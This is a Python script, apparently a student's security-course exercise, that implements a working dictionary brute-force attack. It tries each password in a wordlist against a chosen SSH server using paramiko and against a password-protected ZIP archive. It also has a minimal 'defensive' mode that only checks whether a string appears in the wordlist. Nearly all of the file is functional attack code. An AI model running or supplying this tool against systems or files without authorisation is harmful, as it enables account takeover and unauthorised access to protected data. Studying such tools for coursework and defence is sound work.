#!/usr/bin/env python3

# Script Name:                  ops401code/ops-401d1:Challenge18.py
# Author:                       Cody Blahnik
# Date of latest revision:      5/21/24
# Purpose:                      Brute force tool using wordlists


import zipfile
import time
import paramiko

# Function to perform brute-force attack for both SSH and ZIP file passwords
def brute_force(word_list, target, attack_type, delay=0):
    for word in word_list:
        word = word.strip()
        print(f"Trying password: {word}")
        if attack_type == 'ssh':
            try:
                # Attempt to connect to SSH with the given password
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target['ip'], username=target['username'], password=word, timeout=1)
                print(f"Success! The password is: {word}")
                ssh.close()
                return word
            except paramiko.AuthenticationException:
                print("Authentication failed.")
            except paramiko.SSHException as sshException:
                print(f"Unable to establish SSH connection: {sshException}")
            except Exception as e:
                print(f"Exception: {e}")
            time.sleep(delay)
        elif attack_type == 'zip':
            try:
                # Attempt to extract the ZIP file with the given password
                with zipfile.ZipFile(target['zip_file'], 'r') as zfile:
                    zfile.extractall(pwd=bytes(word, 'utf-8'))
                    print(f"Success! The password is: {word}")
                    return word
            except (RuntimeError, zipfile.BadZipFile):
                pass
    print("Brute-force attack failed. No password matched.")
    return None

# Function to handle the offensive (attack) mode
def offensive():
    choice = input("Select attack type (1 for SSH, 2 for ZIP): ")
    file_path = input("Enter the word list file path: ")
    
    # Read the word list from the provided file
    with open(file_path, encoding="ISO-8859-1") as file:
        word_list = file.readlines()
        
    if choice == '1':
        target = {
            'ip': input("Enter the SSH server IP address: "),
            'username': input("Enter the SSH username: ")
        }
        delay = float(input("Enter the delay between attempts (in seconds): "))
        brute_force(word_list, target, 'ssh', delay)
    elif choice == '2':
        target = {'zip_file': input("Enter the path to the ZIP file: ")}
        brute_force(word_list, target, 'zip')
    else:
        print("Invalid choice.")

# Function to handle the defensive mode (search for a string in the word list)
def defensive():
    user_string = input("Enter the string to search for: ")
    file_path = input("Enter the word list file path: ")
    
    # Search for the user-provided string in the word list
    with open(file_path, 'r', encoding="ISO-8859-1") as file:
        word_list = file.readlines()
        if any(user_string in word for word in word_list):
            print(f"The string '{user_string}' was found in the word list.")
        else:
            print(f"The string '{user_string}' was NOT found in the word list.")

# Main menu for user interaction
def main():
    print("Automated Brute Force Wordlist")
    print("1. Offensive; Dictionary Iterator")
    print("2. Defensive; Password Recognized")
    choice = input("Select an option (1 or 2): ")
    if choice == '1':
        offensive()
    elif choice == '2':
        defensive()
    else:
        print("Invalid choice. Exiting.")

if __name__ == "__main__":
    main()
